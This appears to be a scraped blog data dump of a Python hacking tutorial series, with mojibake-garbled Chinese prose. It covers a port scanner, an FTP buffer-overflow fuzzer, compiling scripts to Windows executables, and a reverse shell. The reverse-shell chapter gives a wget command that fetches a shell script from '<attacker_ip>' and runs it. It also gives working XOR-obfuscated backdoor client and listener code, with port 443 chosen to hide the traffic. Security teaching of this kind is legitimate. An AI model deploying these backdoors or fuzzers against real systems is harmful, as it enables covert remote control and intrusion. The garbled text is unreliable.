æ‰§è¡Œä¸Šé¢çš„å‘½ä»¤ä¹‹åï¼Œå¯¼å…¥ä¾èµ–æ–‡ä»¶å¹¶ä¸”ç”Ÿæˆä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶é‡Œé¢åŒ…å«äº†ä¸‰ä¸ªæ–‡ä»¶&lt;scriptName&gt;.txt,&lt;scriptName&gt;.specå’Œ&lt;scriptName&gt;.exeæ–‡ä»¶ï¼Œå…¶ä¸­.txtä¸.specå¯ä»¥åˆ é™¤æ‰ï¼Œè€Œ.exeçš„æ–‡ä»¶å°±æ˜¯ä½ éœ€è¦çš„æ‰§è¡Œç¨‹åº. å®Œæ•´çš„å°è£…æ‰§è¡Œç¨‹åºPythonè„šæœ¬ç°åœ¨å·²ç»è¢«ç¼–è¯‘æˆäº†windows PEæ–‡ä»¶ï¼Œå¹¶ä¸”ä¸éœ€è¦Pythonè§£é‡Šå™¨å°±èƒ½å¤Ÿåœ¨windowsä¸‹é¢ç‹¬ç«‹è¿è¡Œï¼Œè¿™å¯ä»¥è®©ä½ æ›´è½»æ¾çš„æŠŠè„šæœ¬è¿ç§»åˆ°windowsä¸Šé¢è€Œä¸”ä¸ç”¨æ‹…å¿ƒä¾èµ–åŒ…ç¼ºå¤±çš„é—®é¢˜. ä¸€ä¸ªç®€å•çš„è„šæœ¬: 12345#!/usr/bin/python import os os.system(\"echo Hello World!\") ç°åœ¨æˆ‘ä»¬æŠŠä¸Šé¢è¿™ä¸ªè„šæœ¬ç¼–è¯‘æˆä¸ºä¸€ä¸ªå¯ä»¥æ‰§è¡Œçš„æ–‡ä»¶: Windows 1234c:\\PathToPython\\python.exe pyinstaller.py --onefile helloWorld.py &gt; helloWorld.exeHello World! Linux 1pytnstaller --onefile helloworld.py ç”Ÿæˆåçš„å¯æ‰§è¡Œæ–‡ä»¶åœ¨distæ–‡ä»¶å¤¹ä¸­ å¦‚æœä½ æƒ³æ›´è¯¦ç»†çš„äº†è§£è¿™ä¸ªè¿‡ç¨‹ï¼Œå¯ä»¥å‚è€ƒBACK TO THE SOURCE CODE â€“ Forward/Reverse Engineering Python Malware æŠŠä½ çš„pythonè„šæœ¬ç¼–è¯‘æˆä¸€ä¸ªå¯ä»¥åœ¨windowsä¸Šé¢å¯ä»¥æ‰§è¡Œçš„å¯æ‰§è¡Œç¨‹åºæ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œå› ä¸ºå®ƒä¸éœ€è¦ä½ å®‰è£…pythonè§£é‡Šå™¨è¿˜æœ‰ä¾èµ–åŒ… å¤§å®¶å¯ä»¥å°è¯•ä¸€ä¸‹0x3ä¸­çš„ä¾‹å­ï¼ŒæŠŠé‚£ä¸ªè„šæœ¬ç¼–è¯‘æˆå¯æ‰§è¡Œç¨‹åºã€‚ä¸‹ä¸€ç« ","raw":null,"content":null,"categories":[{"name":"Python","slug":"Python","permalink":"https://kionf.com/categories/Python/"},{"name":"Hacker","slug":"Python/Hacker","permalink":"https://kionf.com/categories/Python/Hacker/"}],"tags":[]},{"title":"Pythoné»‘å®¢ä¹‹æ—…0x4","slug":"pythonhacker_0x4","date":"2015-10-15T16:00:00.000Z","updated":"2018-10-31T10:19:28.319Z","comments":true,"path":"2015/10/16/pythonhacker_0x4/","link":"","permalink":"https://kionf.com/2015/10/16/pythonhacker_0x4/","excerpt":"ç¼–å†™Fuzzæµ‹è¯•è„šæœ¬ è¿™ä¸€ç« å°†ä¼šæ¼”ç¤ºæ•™ä½ å¦‚ä½•å†™ä¸€ä¸ªå±äºè‡ªå·±çš„Fuzzæµ‹è¯•è„šæœ¬ï¼Œå½“æˆ‘ä»¬è¿›è¡Œexploitç ”ç©¶å’Œå¼€å‘çš„æ—¶å€™å°±å¯ä»¥ä½¿ç”¨è„šæœ¬è¯­è¨€å‘é€å¤§é‡çš„æµ‹è¯•æ•°æ®ç»™å—å®³è€…æœºå™¨ï¼Œä½†æ˜¯è¿™ä¸ªé”™è¯¯æ•°æ®å¾ˆå®¹æ˜“å¼•å‘åº”ç”¨ç¨‹åºå´©æºƒæ‰ã€‚\nè€ŒPythonå´ä¸åŒï¼Œå½“ç¨‹åºå´©æºƒä¹‹åï¼Œæ­¤æ—¶ä½ çš„ç¨‹åºä¼šæš‚æ—¶æ–­å¼€è¿æ¥ï¼Œéšåä¼šç«‹å³åˆ›å»ºä¸€ä¸ªæ–°çš„è¿æ¥ç»§ç»­æ‰§è¡Œã€‚\n ä¸‹é¢æˆ‘ä»¬é¦–å…ˆè¦è§£å†³çš„é—®é¢˜æ˜¯åº”ç”¨ç¨‹åºå¦‚ä½•å¤„ç†ç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼Œå› ä¸ºåœ¨è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šä¸å®šæ—¶çš„æƒ³åˆ°ä¸€äº›æ–°çš„æ€è·¯ç„¶åæŠŠæ•°æ®å‘é€ç»™å—å®³è€…æœºå™¨ä¸Šé¢æ¥æµ‹è¯•ï¼Œè¿™åŸºæœ¬æ€è·¯å°±æ˜¯å…ˆä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥,ç„¶åå‘é€æµ‹è¯•æ•°æ®ç»™æœåŠ¡å™¨ï¼Œé€šè¿‡whileå¾ªç¯è¯­å¥æ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸï¼Œå³ä½¿å‡ºç°é”™è¯¯ä¹Ÿä¼šå¤„ç†æ‰:","text":"ç¼–å†™Fuzzæµ‹è¯•è„šæœ¬ è¿™ä¸€ç« å°†ä¼šæ¼”ç¤ºæ•™ä½ å¦‚ä½•å†™ä¸€ä¸ªå±äºè‡ªå·±çš„Fuzzæµ‹è¯•è„šæœ¬ï¼Œå½“æˆ‘ä»¬è¿›è¡Œexploitç ”ç©¶å’Œå¼€å‘çš„æ—¶å€™å°±å¯ä»¥ä½¿ç”¨è„šæœ¬è¯­è¨€å‘é€å¤§é‡çš„æµ‹è¯•æ•°æ®ç»™å—å®³è€…æœºå™¨ï¼Œä½†æ˜¯è¿™ä¸ªé”™è¯¯æ•°æ®å¾ˆå®¹æ˜“å¼•å‘åº”ç”¨ç¨‹åºå´©æºƒæ‰ã€‚ è€ŒPythonå´ä¸åŒï¼Œå½“ç¨‹åºå´©æºƒä¹‹åï¼Œæ­¤æ—¶ä½ çš„ç¨‹åºä¼šæš‚æ—¶æ–­å¼€è¿æ¥ï¼Œéšåä¼šç«‹å³åˆ›å»ºä¸€ä¸ªæ–°çš„è¿æ¥ç»§ç»­æ‰§è¡Œã€‚ ä¸‹é¢æˆ‘ä»¬é¦–å…ˆè¦è§£å†³çš„é—®é¢˜æ˜¯åº”ç”¨ç¨‹åºå¦‚ä½•å¤„ç†ç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼Œå› ä¸ºåœ¨è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šä¸å®šæ—¶çš„æƒ³åˆ°ä¸€äº›æ–°çš„æ€è·¯ç„¶åæŠŠæ•°æ®å‘é€ç»™å—å®³è€…æœºå™¨ä¸Šé¢æ¥æµ‹è¯•ï¼Œè¿™åŸºæœ¬æ€è·¯å°±æ˜¯å…ˆä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥,ç„¶åå‘é€æµ‹è¯•æ•°æ®ç»™æœåŠ¡å™¨ï¼Œé€šè¿‡whileå¾ªç¯è¯­å¥æ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸï¼Œå³ä½¿å‡ºç°é”™è¯¯ä¹Ÿä¼šå¤„ç†æ‰: ä¸‹é¢æ˜¯æˆ‘ä»¬çš„æ‰«æå™¨ä¼ªä»£ç :1234567891011121314151617181920 #å¯¼å…¥socket,sysæ¨¡å—ï¼Œå¦‚æœæ˜¯webæœåŠ¡é‚£ä¹ˆè¿˜éœ€è¦å¯¼å…¥httplib,urllibç­‰æ¨¡å— &lt;import modules&gt; #è®¾ç½®ip/ç«¯å£#è°ƒç”¨è„šæœ¬: ./script.py &lt;RHOST&gt; &lt;RPORT&gt;RHOST = sys.argv[1]RPORT = sys.argv[2] #å®šä¹‰ä½ çš„æµ‹è¯•æ•°æ®,å¹¶ä¸”è®¾ç½®æµ‹è¯•æ•°æ®èŒƒå›´å€¼buffer = '\\x41'*50 #ä½¿ç”¨å¾ªç¯æ¥è¿æ¥æœåŠ¡å¹¶ä¸”å‘é€æµ‹è¯•æ•°æ®while True: try: # å‘é€æµ‹è¯•æ•°æ® # ç›´åˆ°é€’å¢åˆ°50 buffer = buffer + '\\x41'*50 except: print \"Buffer Length: \"+len(buffer) print \"Can't connect to service...check debugger for potential crash\" ä¸Šé¢è¿™ä¸ªè„šæœ¬æ¡†æ¶èƒ½å¤Ÿé€‚ç”¨äºå„ç§æœåŠ¡ï¼Œä½ å¯ä»¥æ ¹æ®ä½ çš„æœåŠ¡(https,http,mysql,sshd)ç¼–å†™ç‰¹å®šæ¨¡ç³Šæµ‹è¯•è„šæœ¬.ä¸‹é¢æˆ‘ä»¬æ¼”ç¤ºä¸€ä¸ªåŸºäºUSERå‘½ä»¤çš„ftpæœåŠ¡å™¨æ¨¡ç³Šæµ‹è¯•è„šæœ¬: æ¨¡ç³Šæµ‹è¯•è„šæœ¬123456789101112131415161718192021222324252627282930#å¯¼å…¥ä½ å°†è¦ä½¿ç”¨çš„æ¨¡å—ï¼Œè¿™æ ·ä½ å°±ä¸ç”¨å»è‡ªå·±å®ç°é‚£äº›åŠŸèƒ½å‡½æ•°äº†import sys, socketfrom time import sleep #å£°æ˜ç¬¬ä¸€ä¸ªå˜é‡targetç”¨æ¥æ¥æ”¶ä»å‘½ä»¤ç«¯è¾“å…¥çš„ç¬¬ä¸€ä¸ªå€¼target = sys.argv[1]#åˆ›å»º50ä¸ªAçš„å­—ç¬¦ä¸² '\\x41'buff = '\\x41'*50 # ä½¿ç”¨å¾ªç¯æ¥é€’å¢è‡³å£°æ˜buffå˜é‡çš„é•¿åº¦50while True: #ä½¿ç”¨\"try - except\"å¤„ç†é”™è¯¯ä¸åŠ¨ä½œ try: # è¿æ¥è¿™ç›®æ ‡ä¸»æœºçš„ftpç«¯å£ 21 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.settimeout(2) s.connect((target,21)) s.recv(1024) print \"Sending buffer with length: \"+str(len(buff)) #å‘é€å­—ç¬¦ä¸²:USERå¹¶ä¸”å¸¦æœ‰æµ‹è¯•çš„ç”¨æˆ·å s.send(\"USER \"+buff+\"\\r\\n\") s.close() sleep(1) #ä½¿ç”¨å¾ªç¯æ¥é€’å¢ç›´è‡³é•¿åº¦ä¸º50 buff = buff + '\\x41'*50 except: # å¦‚æœè¿æ¥æœåŠ¡å™¨å¤±è´¥ï¼Œæˆ‘ä»¬å°±æ‰“å°å‡ºä¸‹é¢çš„ç»“æœ print \"[+] Crash occured with buffer length: \"+str(len(buff)-50) sys.exit() ä¸Šé¢è¿™æ®µä»£ç æ¼”ç¤ºäº†ä¸€ä¸ªåŸºæœ¬çš„Fuzzæµ‹è¯•è„šæœ¬ï¼Œä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯æ‰§è¡Œä¸Šé¢çš„ä»£ç ï¼Œæäº¤\\x41å­—ç¬¦å¯èƒ½ä¸ä¼šè®©ä½ æˆåŠŸçš„æ‹¿ä¸‹å—å®³ä¸»æœºï¼Œä½†æ˜¯ä½ å¯ä»¥å°è¯•ç»„åˆä¸€äº›å…¶ä»–çš„å­—ç¬¦(ç”¨æˆ·è¯å…¸).æ­¤å¤–è¿˜æœ‰ä¸€ä¸ªæ›´åŠ å¼ºå¤§çš„Fuzzæµ‹è¯•å·¥å…·Spikeå’Œå…·ä½“ä»‹ç»ä¸æ¼”ç¤º,å®ƒå¯ä»¥ä¸€æ¬¡æ€§çš„æµ‹è¯•å¤§é‡æ•°æ®ï¼Œå¹¶ä¸”èƒ½è®©ä½ æé«˜æˆåŠŸæ¦‚ç‡. ç»ƒä¹ å¤§å®¶å¯ä»¥æŠŠä¸Šé¢çš„ftpæµ‹è¯•æ¢æˆhttpæµ‹è¯•ï¼Œè¿™é‡Œæç¤º:ä½ å¯èƒ½éœ€è¦ä½¿ç”¨httplib/urllib.ä¸‹ä¸€ç« ","raw":null,"content":null,"categories":[{"name":"Python","slug":"Python","permalink":"https://kionf.com/categories/Python/"},{"name":"Hacker","slug":"Python/Hacker","permalink":"https://kionf.com/categories/Python/Hacker/"}],"tags":[]},{"title":"Pythoné»‘å®¢ä¹‹æ—…0x3","slug":"pythonhacker_0x3","date":"2015-10-14T16:00:00.000Z","updated":"2018-10-31T10:19:28.319Z","comments":true,"path":"2015/10/15/pythonhacker_0x3/","link":"","permalink":"https://kionf.com/2015/10/15/pythonhacker_0x3/","excerpt":"åå‘shell","text":"åå‘shell å‚è€ƒé˜…è¯»:ä»€ä¹ˆæ˜¯åå‘Shell è¿™ç¯‡æ•™ç¨‹å°†ä¼šæ•™ä½ ä½¿ç”¨Pythonç¼–å†™ä¸€ä¸ªåå‘shellï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆæ¼”ç¤ºä½¿ç”¨Pythonå¦‚ä½•åˆ©ç”¨webæœåŠ¡å™¨çš„åŠŸèƒ½ï¼ŒæŠŠæ–‡ä»¶ä»å¦ä¸€å°ä¸»æœºä¼ é€è¿‡æ¥ã€‚æˆ‘ä»¬å‡è®¾ä½ æœ‰ä¸€å°å‚€å„¡ä¸»æœºï¼Œä½ ç°åœ¨æƒ³ä¸‹è½½å‚€å„¡æœºä¸Šé¢çš„çš„æ–‡ä»¶ã€‚é‚£ä¹ˆä½ å°±å¯ä»¥ä½¿ç”¨shell(æˆ–meterpreter)å»è®¿é—®è¿™å°å‚€å„¡æœºï¼Œä½ å¯ä»¥é€šè¿‡ä¸€è¡ŒPythonä»£ç æŠŠå‚€å„¡æœºå»ºç«‹æˆä¸ºä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œç„¶åä¸‹è½½å‚€å„¡æœºä¸Šé¢çš„æ–‡ä»¶. åˆ›å»ºä¸€ä¸ªpython HTTPæœåŠ¡å™¨å¯ä»¥ç›´æ¥ä½¿ç”¨pythonçš„å†…å»ºå‡½æ•°â€SimpleHTTPServerâ€æ¥åˆ›å»ºï¼Œä½ å¯ä»¥ä½¿ç”¨â€™-mâ€™å‚æ•°ç›´æ¥åœ¨å‘½ä»¤è¡Œè°ƒç”¨æ¨¡å—ï¼Œåˆ›å»ºçš„æœåŠ¡å™¨é»˜è®¤æ˜¯ç›‘å¬çš„8000ç«¯å£ï¼Œä½†æ˜¯ä½ å¯ä»¥æŒ‡å®šç«¯å£ï¼Œç›´æ¥åœ¨â€™SimpleHTTPServerâ€™åé¢è·Ÿä¸€ä¸ªç«¯å£å‚æ•°: 12python -m SimpleHTTPServer 80Serving HTTP on 0.0.0.0 80 ... æˆ‘ä»¬å‡è®¾ä½ æ²¡æœ‰é˜²ç«å¢™å»é˜»æ­¢ä½ çš„è¿æ¥ï¼Œé‚£ä¹ˆä½ æ˜¯å¯ä»¥è¯·æ±‚åˆ°è¿™æœåŠ¡å™¨çš„æ•°æ®ã€‚ä½ å¯ä»¥åœ¨ä»»ä½•ç›®å½•é‡Œé¢å»å¯åŠ¨Python HTTPæœåŠ¡å™¨ï¼Œè¿™æ ·ä½ å°±èƒ½å¤Ÿé€šè¿‡æµè§ˆå™¨æˆ–è€…æ˜¯è¿œç¨‹å®¢æˆ·ç«¯æ¥è®¿é—®è¿™ä¸ªç›®å½•ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç®€å•çš„ä¾‹å­å‘Šè¯‰ä½ ä½¿ç”¨wgetå·¥å…·å»è·å–æ–‡ä»¶,ä½†æ˜¯æœ‰äº›æ—¶å€™å°±ä¼šç»å¸¸å‘ç°ä½ æ ¹æœ¬æ²¡æœ‰æƒé™åœ¨å½“å‰ç›®å½•å†™å…¥æ–‡ä»¶å¹¶ä¸”åˆå§‹åŒ–è¿™ä¸ªè„šæœ¬ï¼Œä½†æ˜¯ä½ å¯ä»¥æ”¹å˜è„šæœ¬æ‰§è¡Œçš„ç›®å½•ï¼Œä¸‹é¢è¿™ä¸ªä¾‹å­å°±æ¼”ç¤ºäº†æŠŠè„šæœ¬åœ¨/tmpç›®å½•ä¸‹é¢æ‰§è¡Œï¼š 1234567891011#ä½¿ç”¨-Oå‚æ•°ï¼ŒæŠŠæ–‡ä»¶ä¿å­˜åœ¨å…¶ä»–ç›®å½•- /tmp/ ä¸€èˆ¬å¯å†™wget -O /tmp/shell.py http://&lt;attacker_ip&gt;/shell.py #ä¿®æ”¹æƒé™chmod a+x /tmp/shell.py # ä½¿ç”¨fileå‘½ä»¤æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æ­£ç¡®file /tmp/shell.py #æ‰§è¡Œè„šæœ¬/usr/bin/python /tmp/shell.py å®¢æˆ·ç«¯åå‘shellä»£ç é˜…è¯»ä¸‹é¢çš„åé—¨ä»£ç ã€‚ç¼–ç æ—¶ä¼šä½¿ç”¨åˆ°socketï¼Œsubprocesså’Œsysæ¨¡å—ï¼Œé€‰æ‹©subprocessæ¨¡å—åŸå› ï¼Œæ˜¯å› ä¸ºå®ƒå…è®¸ä½¿ç”¨ä¸€ä¸ªå˜é‡å‚¨å­˜STDOUTè¾“å‡ºçš„ç»“æœï¼Œä¹‹åå¯ä»¥åœ¨ä»£ç ä¸­çš„å…¶ä»–éƒ¨åˆ†é€šè¿‡è°ƒç”¨æ­¤å˜é‡è®¿é—®ä¿å­˜çš„STDOUTæ•°æ®ã€‚ä¸‹é¢çš„ä»£ç ä¸­ï¼šæ‰€å»ºç«‹çš„è¿æ¥ä¼šç›‘å¬443ç«¯å£ã€‚443ç«¯å£ç»å¸¸ç”¨åœ¨httpsä¸Šï¼Œè¿™é‡Œä½¿ç”¨443ç«¯å£å¯ä»¥èµ·åˆ°æ··æ·†è§†å¬çš„ä½œç”¨: 1234567891011121314151617181920212223242526272829#!/usr/bin/python import socket,subprocess,sys RHOST = sys.argv[1]RPORT = 443s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((RHOST, RPORT)) while True: # ä»socketä¸­æ¥æ”¶XORç¼–ç çš„æ•°æ® data = s.recv(1024) # XOR the data again with a '\\x41' to get back to normal data en_data = bytearray(data) for i in range(len(en_data)): en_data[i] ^=0x41 # æ‰§è¡Œè§£ç å‘½ä»¤ï¼Œsubprocessæ¨¡å—èƒ½å¤Ÿé€šè¿‡PIPE STDOUT/STDERR/STDINæŠŠå€¼èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) comm.wait() STDOUT, STDERR = comm.communicate() # è¾“å‡ºç¼–ç åçš„æ•°æ®å¹¶ä¸”å‘é€ç»™æŒ‡å®šçš„ä¸»æœºRHOST en_STDOUT = bytearray(STDOUT) for i in range(len(en_STDOUT)): en_STDOUT[i] ^=0x41 s.send(en_STDOUT)s.close() ä¸Šé¢çš„ä»£ç ä¸­æœ‰äº›æ¦‚å¿µå·²ç»åœ¨0x2ä»‹ç»è¿‡äº†ï¼Œä½†æ˜¯é™¤äº†ä¹‹å‰çš„ä½¿ç”¨socketåˆ›å»ºä¸€ä¸ªè¿æ¥ä¹‹å¤–ï¼Œæˆ‘ä»¬é€šè¿‡subprocessæ¨¡å—æ‰§è¡Œäº†ä¸€ä¸ªå‘½ä»¤ï¼Œsubprocessæ¨¡å—éå¸¸çš„æ–¹ä¾¿ï¼Œå®ƒå…è®¸ä½ é€šè¿‡STDOUT/STDERRå‘½ä»¤ç›´æ¥æŠŠå€¼èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡å‘½ä»¤æŠŠè¾“å‡ºçš„è¿›è¡Œç¼–ç ç„¶åé€šè¿‡socketç½‘ç»œå‘é€å‡ºå»ã€‚ ä½¿ç”¨OXRçš„å¥½å¤„å°±æ˜¯ä½ èƒ½å¤Ÿå¾ˆå®¹æ˜“ç¼–ç ä½ è¦å‘é€è¿‡å»çš„æ•°æ®ï¼Œç„¶åé€šè¿‡ç›¸åŒçš„å¯†é’¥æ¥è§£ç è¿”å›çš„æ•°æ®ï¼Œæœ€åè§£ç åçš„æ•°æ®å¯ä»¥ä»¥æ˜æ–‡çš„å½¢å¼å»æ‰§è¡Œå‘½ä»¤ã€‚ æœåŠ¡ç«¯ç›‘å¬shellä»£ç ç°åœ¨ä¸ºäº†åˆ©ç”¨å¥½è¿™ä¸ªåé—¨ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç›‘å¬è„šæœ¬å¹¶ä¸”è§£ç åç«¯ä¼ è¾“è¿‡æ¥çš„æ•°æ®ï¼Œè®©æˆ‘ä»¬é€šè¿‡æ˜æ–‡å¾ˆæ¸…æ™°çš„çœ‹æ¸…æ¥šè¿”å›çš„æ•°æ®ã€‚ ä¸‹é¢æˆ‘ä»¬å°†è¦è®¾è®¡ä¸€ä¸ªç›‘å¬å™¨ã€‚æ¥è·å–åå‘shellçš„æ•°æ®ï¼Œå¹¶ä¸”èƒ½å¤Ÿå¯¹äºè¾“å…¥ï¼è¾“å‡ºçš„è¿›è¡Œè§£ç /ç¼–ç ï¼Œä¸ºäº†èƒ½å¤Ÿåœ¨ç»ˆç«¯ä¸Šé¢èƒ½å¤Ÿå¾ˆæ¸…æ™°çš„çœ‹å‡ºæ¥ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨XORç¼–ç : 1234567891011121314151617181920212223import socket s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.bind((\"0.0.0.0\", 443))s.listen(2)print \"Listening on port 443... \"(client, (ip, port)) = s.accept()print \" Received connection from : \", ipwhile True: command = raw_input('~$ ') encode = bytearray(command) for i in range(len(encode)): encode[i] ^=0x41 client.send(encode) en_data=client.recv(2048) decode = bytearray(en_data) for i in range(len(decode)): decode[i] ^=0x41 print decode client.close()s.close() è¿™ç« çš„ä¾‹å­éå¸¸æœ‰è¶£ï¼Œå¯¹äºå­¦ä¹ ä¿¡æ¯å®‰å…¨çš„æœ‹å‹éƒ½å–œæ¬¢shellï¼Œå¤§å®¶å¯ä»¥å¯¹ä»£ç åšç‚¹ä¿®æ”¹è®©è¿™ä¸ªè„šæœ¬ä¹Ÿèƒ½å¤Ÿåœ¨windowä¸Šé¢ä¹Ÿèƒ½å¤Ÿæ­£å¸¸è¿è¡Œï¼Œæœ€åå¤§å®¶å¯ä»¥ä½¿ç”¨base64æ¥ä»£æ›¿XORè¿›è¡Œç¼–ç ä¸è§£ç ï¼Œè¿™äº›ç»ƒä¹ è®©ä½ ä½ æ›´åŠ ç†Ÿç»ƒçš„ä½¿ç”¨python.ä¸‹ä¸€ç« ","raw":null,"content":null,"categories":[{"name":"Python","slug":"Python","permalink":"https://kionf.com/categories/Python/"},{"name":"Hacker","slug":"Python/Hacker","permalink":"https://kionf.com/categories/Python/Hacker/"}],"tags":[]},{"title":"Pythoné»‘å®¢ä¹‹æ—…0x2","slug":"pythonhacker_0x2","date":"2015-10-13T16:00:00.000Z","updated":"2018-10-31T10:19:28.319Z","comments":true,"path":"2015/10/14/pythonhacker_0x2/","link":"","permalink":"https://kionf.com/2015/10/14/pythonhacker_0x2/","excerpt":"ç«¯å£æ‰«æè¿™ä¸€ç« å°†ä¼šæ¼”ç¤ºå¦‚ä½•é€šè¿‡Pythonçš„ç½‘ç»œè¿æ¥æ¥å¼€å‘ä¸€ä¸ªåŸºç¡€çš„ç«¯å£æ‰«æå™¨,æˆ‘ä»¬çš„è®¾è®¡æ€è·¯æ˜¯ä½¿ç”¨socketä¸€éåˆä¸€éçš„å»è¿æ¥ipä¸ç«¯å£çš„ç»„åˆçš„æ–°å€¼,ä¸ºäº†æ–¹é¢æˆ‘ä»¬èƒ½å¤Ÿå¿«é€Ÿçš„å®Œæˆå®ƒï¼Œé¦–å…ˆéœ€è¦ä»‹ç»ä¸€ç‚¹æ–°çš„æ¦‚å¿µ,forå¾ªç¯:","text":"ç«¯å£æ‰«æè¿™ä¸€ç« å°†ä¼šæ¼”ç¤ºå¦‚ä½•é€šè¿‡Pythonçš„ç½‘ç»œè¿æ¥æ¥å¼€å‘ä¸€ä¸ªåŸºç¡€çš„ç«¯å£æ‰«æå™¨,æˆ‘ä»¬çš„è®¾è®¡æ€è·¯æ˜¯ä½¿ç”¨socketä¸€éåˆä¸€éçš„å»è¿æ¥ipä¸ç«¯å£çš„ç»„åˆçš„æ–°å€¼,ä¸ºäº†æ–¹é¢æˆ‘ä»¬èƒ½å¤Ÿå¿«é€Ÿçš„å®Œæˆå®ƒï¼Œé¦–å…ˆéœ€è¦ä»‹ç»ä¸€ç‚¹æ–°çš„æ¦‚å¿µ,forå¾ªç¯: 12345678910111213141516171819202122232425262728&gt;&gt;&gt;&gt;&gt;&gt; for port in range(1000,1024):... print \"[+] The port is: \"+str(port)...[+] The port is: 1000[+] The port is: 1001[+] The port is: 1002[+] The port is: 1003[+] The port is: 1004[+] The port is: 1005[+] The port is: 1006[+] The port is: 1007[+] The port is: 1008[+] The port is: 1009[+] The port is: 1010[+] The port is: 1011[+] The port is: 1012[+] The port is: 1013[+] The port is: 1014[+] The port is: 1015[+] The port is: 1016[+] The port is: 1017[+] The port is: 1018[+] The port is: 1019[+] The port is: 1020[+] The port is: 1021[+] The port is: 1022[+] The port is: 1023 æ³¨æ„ä¸Šé¢é‚£æ®µä»£ç åœ¨å¾ªç¯ä½“å†…çš„ç¼©è¿›ï¼Œé€šå¸¸æƒ…å†µä¸‹æ˜¯ç©ºä¸¤æ ¼æˆ–ä¸€ä¸ªtabé”®ï¼Œä½†è¿™éƒ½æ²¡æœ‰å…³ç³»ï¼Œåªè¦ä½ çš„æ•´ä¸ªä»£ç ä¸€ç›´å°±å¯ä»¥äº†ã€‚æˆ‘ä¹ˆæ‰€å†™çš„é‚£ä¸ªç®€çŸ­çš„ç«¯å£æ‰«æå™¨çš„æ ¸å¿ƒä»£ç ä¼šå†™åœ¨ä¸Šé¢ä»£ç ä¸­çš„è¾“å‡ºå—éƒ¨åˆ†ï¼Œç„¶åå»ºç«‹ä¸€ä¸ªsocketè¿æ¥ã€‚ä¸‹é¢çš„ä»£ç å°±æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨å†…å»ºçš„socketæ¨¡å—å»å»ºç«‹ä¸€ä¸ªsocketè¿æ¥ï¼š 12345678910&gt;&gt;&gt;&gt;&gt;&gt; import socket&gt;&gt;&gt;&gt;&gt;&gt; s = socket.socket()&gt;&gt;&gt; s.connect(('127.0.0.1s', 22))&gt;&gt;&gt; s.send('Primal Security \\n')17&gt;&gt;&gt; banner = s.recv(1024)&gt;&gt;&gt; print bannerOpenSSH ä¸Šé¢è¿™ä¸ªä¾‹å­ï¼šæˆ‘ä»¬å…ˆimportè¿™socketæ¨¡å—å¹¶ä¸”è°ƒç”¨connect()å‡½æ•°å»è¿æ¥æŒ‡å®šçš„IPåœ°å€ä¸ç«¯å£ã€‚å®ƒå°±ä¼šå»ºç«‹ä¸€ä¸ªTCPè¿æ¥(SYN/SYN-ACK/ACK)å¹¶ä¸”æˆ‘ä»¬å†é€šè¿‡send()å‡½æ•°ç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªçœŸå®çš„æ•°æ®ï¼Œç„¶åä½¿ç”¨recv()æ‰“å°å‡ºå“åº”çš„å†…å®¹ã€‚ç°åœ¨æ•™å¤§å®¶å¦‚ä½•å®¹é”™socketï¼Œå¯¹äºä¸èƒ½æ‰“å¼€çš„è¿æ¥: 123456&gt;&gt;&gt;&gt;&gt;&gt; s.connect(('127.0.0.1', 23))Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in ? File \"&lt;string&gt;\", line 1, in connectsocket.error: (111, 'Connection refused') å¯¹äºä¸Šé¢çš„é”™è¯¯æœ‰è‹¥å¹²ä¸­å¤„ç†æ–¹å¼ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨æœ€ç®€å•çš„ä¸€ç§æ–¹å¼ï¼šä½¿ç”¨try/exceptå¾ªç¯æ¥å¤„ç†é”™è¯¯: 123456&gt;&gt;&gt;&gt;&gt;&gt; try:... s.connect(('127.0.0.1', 23))... except: pass...&gt;&gt;&gt; ç°åœ¨å°±ä¸ä¼šå‡ºç°é”™è¯¯äº†ï¼Œä¸€è¡Œå¾ˆç®€å•çš„ä»£ç å°±è®©ä½ çš„ç¨‹åºèƒ½å¤Ÿç»§ç»­å·¥ä½œä¸‹å»^_^ã€‚ç°åœ¨è®©æˆ‘ä»¬ä½¿ç”¨ä¹‹å‰å­¦åˆ°çš„çŸ¥è¯†ï¼Œä½¿ç”¨forå¾ªç¯æ¥å†™ä¸€ä¸ªç®€å•çš„ç«¯å£æ‰«æå™¨: 1234567891011121314151617181920&gt;&gt;&gt;&gt;&gt;&gt; for port in range(20,25):... try:... print \"[+] Attempting to connect to 127.0.0.1:\"+str(port)... s.connect(('127.0.0.1', port))... s.send('Primal Security \\n') ... banner = s.recv(1024)... if banner:... print \"[+] Port \"+str(port)+\" open: \"+banner... s.close()... except: pass...17[+] Attempting to connect to 127.0.0.1:20[+] Attempting to connect to 127.0.0.1:21[+] Attempting to connect to 127.0.0.1:22[+] Port 22 open: OpenSSH[+] Attempting to connect to 127.0.0.1:23[+] Attempting to connect to 127.0.0.1:24[+] Attempting to connect to 127.0.0.1:25 